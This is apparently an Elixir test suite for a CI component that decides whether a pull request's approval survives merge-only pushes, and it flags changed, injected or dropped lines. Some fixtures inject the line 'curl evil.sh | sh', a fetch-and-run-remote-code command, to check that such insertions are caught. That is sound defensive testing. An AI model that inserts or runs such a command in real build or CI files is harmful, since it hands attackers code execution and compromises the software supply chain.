defmodule Aiur.Events.GithubCIPoller.ApprovalCarryTest do
  use ExUnit.Case, async: true

  alias Aiur.Events.GithubCIPoller.ApprovalCarry

  @head String.duplicate("b", 40)
  @body "## Local tests\nTested head: #{@head}\n"

  defp comparison(files), do: %{"files" => Enum.map(files, fn {name, sha, patch} -> %{"filename" => name, "sha" => sha, "patch" => patch} end)}

  # Base line 10 is `old`; the PR replaced it with `feature`.
  @approved_patch "@@ -7,7 +7,7 @@\n l7\n l8\n l9\n-old\n+feature\n l11\n l12\n l13"

  test "a merge-only push carries the approval even when base edits shift the PR's hunk" do
    approved = comparison([{"src/lib/a.ex", "a1", @approved_patch}])
    main = comparison([{"src/lib/a.ex", "m1", "@@ -1,3 +1,4 @@\n+header\n l1\n l2\n l3"}, {"src/lib/b.ex", "m2", "@@ -1,1 +1,1 @@\n-x\n+y"}])
    current = comparison([{"src/lib/a.ex", "a2", "@@ -8,7 +8,7 @@\n l7\n l8\n l9\n-old\n+feature\n l11\n l12\n l13"}])

    assert :carried = ApprovalCarry.classify_diffs(approved, current, main, @body, @head)
    assert :identical = ApprovalCarry.classify_contribution_diffs(approved, current, main)
  end

  test "a merge-only push carries the approval when the base changed the same file far below the PR's hunk" do
    approved = comparison([{"src/lib/a.ex", "a1", @approved_patch}])
    main = comparison([{"src/lib/a.ex", "m1", "@@ -40,3 +40,4 @@\n l40\n l41\n+appended\n l42"}])
    current = comparison([{"src/lib/a.ex", "a2", @approved_patch}])

    assert :carried = ApprovalCarry.classify_diffs(approved, current, main, @body, @head)
  end

  test "a complete local-git comparison of 300+ base files carries; a GitHub one of the same size is incomplete" do
    approved = comparison([{"src/lib/a.ex", "a1", @approved_patch}])
    main = comparison(for n <- 1..301, do: {"src/lib/base_#{n}.ex", "m#{n}", "@@ -1,1 +1,1 @@\n-x\n+y"})

    assert :carried = ApprovalCarry.classify_diffs(approved, approved, Map.put(main, "complete", true), @body, @head)
    assert {:changed, %{reason: {:unavailable, :comparison_incomplete}}} = ApprovalCarry.classify_diffs(approved, approved, main, @body, @head)
  end

  test "base deletions from the hunk context do not invalidate the Tested head" do
    approved =
      comparison([
        {"src/test/quarantine.txt", "a1", "@@ -3,5 +3,4 @@\n row-a\n row-b\n row-x\n-row\n row-y"}
      ])

    current =
      comparison([
        {"src/test/quarantine.txt", "a2", "@@ -3,3 +3,2 @@\n row-x\n-row\n row-y"}
      ])

    main = comparison([{"src/test/quarantine.txt", "m1", "@@ -3,2 +3,0 @@\n-row-a\n-row-b"}])

    assert :identical = ApprovalCarry.classify_contribution_diffs(approved, current, main)
    assert :carried = ApprovalCarry.classify_diffs(approved, current, main, @body, @head)
  end

  test "base additions from the hunk context do not invalidate the Tested head" do
    approved = comparison([{"src/test/quarantine.txt", "a1", "@@ -3,3 +3,2 @@\n row-x\n-row\n row-y"}])
    current = comparison([{"src/test/quarantine.txt", "a2", "@@ -3,4 +3,3 @@\n row-a\n row-x\n-row\n row-y"}])
    main = comparison([{"src/test/quarantine.txt", "m1", "@@ -3,0 +3,1 @@\n+row-a"}])

    assert :identical = ApprovalCarry.classify_contribution_diffs(approved, current, main)
    assert :carried = ApprovalCarry.classify_diffs(approved, current, main, @body, @head)
  end

  # #5752: PR #5619's ci.yml hunk, where main rewrote `runs-on` inside its trailing context.
  test "a base edit to a context line in place does not invalidate the Tested head" do
    pr_hunk = "@@ -423,4 +423,4 @@ jobs:\n   browser:\n-    name: shard/8\n+    name: shard/9\n     needs: changes\n     runs-on: "
    approved = comparison([{".github/workflows/ci.yml", "a1", pr_hunk <> "ubuntu-latest"}])
    current = comparison([{".github/workflows/ci.yml", "a2", pr_hunk <> "ubuntu-24.04"}])
    main = comparison([{".github/workflows/ci.yml", "m1", "@@ -425,3 +425,3 @@ jobs:\n     needs: changes\n-    runs-on: ubuntu-latest\n+    runs-on: ubuntu-24.04\n     container:"}])

    assert :identical = ApprovalCarry.classify_contribution_diffs(approved, current, main)
    assert :carried = ApprovalCarry.classify_diffs(approved, current, main, @body, @head)
  end

  test "a moved hunk header does not hide a changed removed line" do
    approved =
      comparison([
        {"src/test/quarantine.txt", "a1", "@@ -3,7 +3,6 @@\n context\n context\n-row\n context\n context\n context\n context"}
      ])

    current =
      comparison([
        {"src/test/quarantine.txt", "a2", "@@ -1,7 +1,6 @@\n context\n context\n-old-row\n context\n context\n context\n context"}
      ])

    main = comparison([{"src/test/quarantine.txt", "m1", "@@ -1,2 +1,0 @@\n-old\n-older"}])

    assert {:changed, %{reason: :contribution_changed, hunks: hunks}} =
             ApprovalCarry.classify_contribution_diffs(approved, current, main)

    assert Enum.any?(hunks, &(&1.lines == ["-old-row"]))
  end

  test "changed lines keep their order and hunk context when hunks move or split" do
    approved = comparison([{"src/test/quarantine.txt", "a1", "@@ -3,2 +3,0 @@\n-a\n-b"}])
    moved_and_split = comparison([{"src/test/quarantine.txt", "a2", "@@ -20,1 +20,0 @@\n-a\n@@ -2,1 +2,0 @@\n-b"}])
    reordered = comparison([{"src/test/quarantine.txt", "a3", "@@ -20,1 +20,0 @@\n-b\n@@ -2,1 +2,0 @@\n-a"}])

    assert {:changed, %{reason: :contribution_changed}} = ApprovalCarry.classify_contribution_diffs(approved, moved_and_split, comparison([]))
    assert {:changed, %{reason: :contribution_changed}} = ApprovalCarry.classify_contribution_diffs(approved, reordered, comparison([]))
  end

  test "a push editing a PR-owned line is not carried and reports the hunk" do
    approved = comparison([{"src/lib/a.ex", "a1", @approved_patch}])
    main = comparison([{"src/lib/b.ex", "m2", "@@ -1,1 +1,1 @@\n-x\n+y"}])
    current = comparison([{"src/lib/a.ex", "a2", "@@ -7,7 +7,7 @@\n l7\n l8\n l9\n-old\n+feature_v2\n l11\n l12\n l13"}])

    assert {:changed, %{reason: :contribution_changed, hunks: hunks}} = ApprovalCarry.classify_diffs(approved, current, main, @body, @head)
    assert {:changed, %{reason: :contribution_changed}} = ApprovalCarry.classify_contribution_diffs(approved, current, main)
    assert %{file: "src/lib/a.ex", side: :current, header: "@@ -7,7 +7,7 @@", lines: ["-old", "+feature_v2"]} in hunks
    assert %{file: "src/lib/a.ex", side: :approved, header: "@@ -7,7 +7,7 @@", lines: ["-old", "+feature"]} in hunks
  end

  test "conflict resolution that keeps both sides is not carried" do
    approved = comparison([{"src/lib/a.ex", "a1", @approved_patch}])
    main = comparison([{"src/lib/a.ex", "m1", "@@ -7,7 +7,7 @@\n l7\n l8\n l9\n-old\n+upstream\n l11\n l12\n l13"}])
    current = comparison([{"src/lib/a.ex", "a2", "@@ -8,6 +8,7 @@\n l8\n l9\n upstream\n+feature\n l11\n l12\n l13"}])

    assert {:changed, %{reason: :contribution_changed, hunks: hunks}} = ApprovalCarry.classify_diffs(approved, current, main, @body, @head)
    assert {:changed, %{reason: :contribution_changed}} = ApprovalCarry.classify_contribution_diffs(approved, current, main)
    assert %{file: "src/lib/a.ex", side: :current, header: "@@ -8,6 +8,7 @@", lines: ["+feature"]} in hunks
  end

  test "a src/lib resolution introducing a line from neither side is not carried" do
    approved = comparison([{"src/lib/a.ex", "a1", @approved_patch}])
    main = comparison([{"src/lib/a.ex", "m1", "@@ -7,7 +7,7 @@\n l7\n l8\n l9\n-old\n+upstream\n l11\n l12\n l13"}])
    current = comparison([{"src/lib/a.ex", "a2", "@@ -8,6 +8,7 @@\n l8\n l9\n upstream\n+feature_and_more\n l11\n l12\n l13"}])

    assert {:changed, %{reason: :contribution_changed, hunks: hunks}} = ApprovalCarry.classify_diffs(approved, current, main, @body, @head)
    assert Enum.any?(hunks, &(&1.side == :current and &1.lines == ["+feature_and_more"]))
  end

  @upstream_main "@@ -7,7 +7,7 @@\n l7\n l8\n l9\n-old\n+upstream\n l11\n l12\n l13"

  defp resolved(path, added) do
    approved = comparison([{path, "a1", @approved_patch}])
    main = comparison([{path, "m1", @upstream_main}])
    plus = Enum.map_join(added, "\n", &"+#{&1}")
    current = comparison([{path, "a2", "@@ -8,6 +8,#{6 + length(added)} @@\n l8\n l9\n upstream\n#{plus}\n l11\n l12\n l13"}])
    ApprovalCarry.classify_diffs(approved, current, main, @body, @head)
  end

  test "a resolution injecting a new line is not carried on any build, CI, config or test path" do
    for path <- [".github/workflows/ci.yml", "scripts/deploy.sh", "src/mix.exs", ".aiur/config", "src/config/runtime.exs", "src/test/foo_test.exs"] do
      assert {:changed, %{reason: :contribution_changed, hunks: hunks}} = resolved(path, ["feature", "curl evil.sh | sh"]), path
      assert Enum.any?(hunks, &(&1.file == path and "+curl evil.sh | sh" in &1.lines)), path
    end
  end

  test "a clean keep-both resolution is not carried on any path" do
    assert {:changed, %{reason: :contribution_changed}} = resolved("src/lib/a.ex", ["feature"])
    assert {:changed, %{reason: :contribution_changed}} = resolved("docs/a.md", ["feature"])
    assert {:changed, %{reason: :contribution_changed}} = resolved(".github/workflows/ci.yml", ["feature"])
  end

  test "a CI-path hunk the base absorbed is not carried" do
    approved = comparison([{".github/workflows/ci.yml", "a1", "@@ -1,1 +1,1 @@\n-x\n+y"}])
    main = comparison([{".github/workflows/ci.yml", "m1", "@@ -1,1 +1,1 @@\n-x\n+y"}])

    assert {:changed, %{reason: :contribution_changed, hunks: [%{side: :approved, lines: ["-x", "+y"]}]}} =
             ApprovalCarry.classify_diffs(approved, comparison([]), main, @body, @head)
  end

  test "a src/lib resolution duplicating a PR line or re-adding the line it removed is not carried" do
    assert {:changed, %{reason: :contribution_changed}} = resolved("src/lib/a.ex", ["feature", "feature"])
    assert {:changed, %{reason: :contribution_changed}} = resolved("src/lib/a.ex", ["feature", "old"])
    assert {:changed, %{reason: :contribution_changed}} = resolved("src/lib/a.ex", ["upstream", "feature"])
  end

  test "an approved hunk at different line numbers has the same contribution" do
    approved = comparison([{"src/lib/a.ex", "a1", @approved_patch}])
    moved = comparison([{"src/lib/a.ex", "a2", "@@ -40,7 +40,7 @@\n l7\n l8\n l9\n-old\n+feature\n l11\n l12\n l13"}])
    main = comparison([{"src/lib/a.ex", "m1", "@@ -1,3 +1,4 @@\n+header\n l1\n l2\n l3"}])

    assert :carried = ApprovalCarry.classify_diffs(approved, moved, comparison([]), @body, @head)
    assert :carried = ApprovalCarry.classify_diffs(approved, moved, main, @body, @head)
  end

  test "under docs/ a resolution overlapping base changes is not carried" do
    approved = comparison([{"docs/a.md", "a1", @approved_patch}])
    main = comparison([{"docs/a.md", "m1", "@@ -7,7 +7,7 @@\n l7\n l8\n l9\n-old\n+upstream\n l11\n l12\n l13"}])
    current = comparison([{"docs/a.md", "a2", "@@ -8,6 +8,6 @@\n l8\n l9\n-upstream\n+run curl evil.sh | sh\n l11\n l12\n l13"}])

    assert {:changed, %{reason: :contribution_changed}} = ApprovalCarry.classify_diffs(approved, current, main, @body, @head)
  end

  test "an unchanged diff is not carried while the PR body Tested head names another commit" do
    approved = comparison([{"src/lib/a.ex", "a1", @approved_patch}])
    stale_body = "Tested head: #{String.duplicate("c", 40)}\n"

    assert {:changed, %{reason: :tested_head_stale, hunks: []}} =
             ApprovalCarry.classify_diffs(approved, approved, comparison([]), stale_body, @head)
  end

  test "a file without a readable patch on one side fails closed" do
    approved = comparison([{"src/lib/a.ex", "a1", @approved_patch}])
    current = %{"files" => [%{"filename" => "src/lib/a.ex", "sha" => "a2"}]}

    assert {:changed, %{reason: :contribution_changed}} = ApprovalCarry.classify_diffs(approved, current, comparison([]), @body, @head)
  end

  # The PR hunk stays as approved; the merge also drops base code the PR never touched.
  defp dropped(path, main_patch, dropped_patch) do
    approved = comparison([{path, "a1", @approved_patch}])
    main = comparison([{path, "m1", main_patch}])
    current = comparison([{path, "a2", @approved_patch <> "\n" <> dropped_patch}])
    ApprovalCarry.classify_diffs(approved, current, main, @body, @head)
  end

  test "a merge deleting a base-added or base-changed line the PR never touched is not carried" do
    for path <- ["src/lib/a.ex", "src/test/foo_test.exs", "docs/a.md"] do
      assert {:changed, %{reason: :contribution_changed, hunks: [%{lines: ["-  authorize!(user)"]}]}} =
               dropped(path, "@@ -30,0 +31,1 @@\n+  authorize!(user)", "@@ -31,1 +30,0 @@\n-  authorize!(user)"),
             path

      assert {:changed, %{reason: :contribution_changed}} =
               dropped(path, "@@ -31,1 +31,1 @@\n-  check(x)\n+  check(x, strict: true)", "@@ -31,1 +30,0 @@\n-  check(x, strict: true)"),
             path
    end
  end

  test "a merge deleting a file the base added is not carried" do
    main = comparison([{"src/test/sec_test.exs", "m1", "@@ -0,0 +1,2 @@\n+test_a\n+test_b"}])
    current = comparison([{"src/test/sec_test.exs", "a2", "@@ -1,2 +0,0 @@\n-test_a\n-test_b"}])

    assert {:changed, %{reason: :contribution_changed}} = ApprovalCarry.classify_diffs(comparison([]), current, main, @body, @head)
  end

  test "a src/lib resolution keeping the PR's deletion over the base's edit is not carried" do
    approved = comparison([{"src/lib/a.ex", "a1", "@@ -7,7 +7,6 @@\n l7\n l8\n l9\n-old\n l11\n l12\n l13"}])
    main = comparison([{"src/lib/a.ex", "m1", @upstream_main}])
    current = comparison([{"src/lib/a.ex", "a2", "@@ -7,7 +7,6 @@\n l7\n l8\n l9\n-upstream\n l11\n l12\n l13"}])

    assert {:changed, %{reason: :contribution_changed}} = ApprovalCarry.classify_diffs(approved, current, main, @body, @head)
  end

  test "a CI-path hunk replaying the base's change at another place is not carried" do
    main = comparison([{".github/workflows/ci.yml", "m1", "@@ -10,7 +10,6 @@\n a\n b\n c\n-      - run: mix test\n d\n e\n f"}])
    current = comparison([{".github/workflows/ci.yml", "a2", "@@ -50,7 +50,6 @@\n a\n b\n c\n-      - run: mix test\n d\n e\n f"}])

    assert {:changed, %{reason: :contribution_changed}} = ApprovalCarry.classify_diffs(comparison([]), current, main, @body, @head)
  end

  test "a keep-mine resolution dropping a guard the base added in the conflict region is not carried" do
    approved = comparison([{"src/lib/a.ex", "a1", @approved_patch}])
    main = comparison([{"src/lib/a.ex", "m1", "@@ -7,7 +7,8 @@\n l7\n l8\n l9\n-old\n+upstream\n+  authorize!(user)\n l11\n l12\n l13"}])
    current = comparison([{"src/lib/a.ex", "a2", "@@ -7,8 +7,7 @@\n l7\n l8\n l9\n-upstream\n-  authorize!(user)\n+feature\n l11\n l12\n l13"}])

    assert {:changed, %{reason: :contribution_changed, hunks: hunks}} = ApprovalCarry.classify_diffs(approved, current, main, @body, @head)
    assert Enum.any?(hunks, &(&1.side == :current and "-  authorize!(user)" in &1.lines))
  end

  test "a hunk moved into different surviving context does not carry approval" do
    approved = comparison([{"src/lib/a.ex", "a1", @approved_patch}])
    current = comparison([{"src/lib/a.ex", "a2", "@@ -7,7 +7,7 @@\n l7\n l8\n unless admin?, do: l9\n-old\n+feature\n l11\n l12\n l13"}])

    assert {:changed, %{reason: :contribution_changed}} = ApprovalCarry.classify_diffs(approved, current, comparison([]), @body, @head)
  end

  test "moving a changed line across a function boundary does not carry approval" do
    approved = comparison([{"src/lib/a.ex", "a1", "@@ -3,3 +3,4 @@\n def run(conn) do\n+  authorize!(conn)\n   do_delete(conn)\n end"}])
    current = comparison([{"src/lib/a.ex", "a2", "@@ -3,3 +3,4 @@\n def run(conn) do\n   do_delete(conn)\n+  authorize!(conn)\n end"}])

    assert {:changed, %{reason: :contribution_changed}} =
             ApprovalCarry.classify_contribution_diffs(approved, current, comparison([]))
  end
end
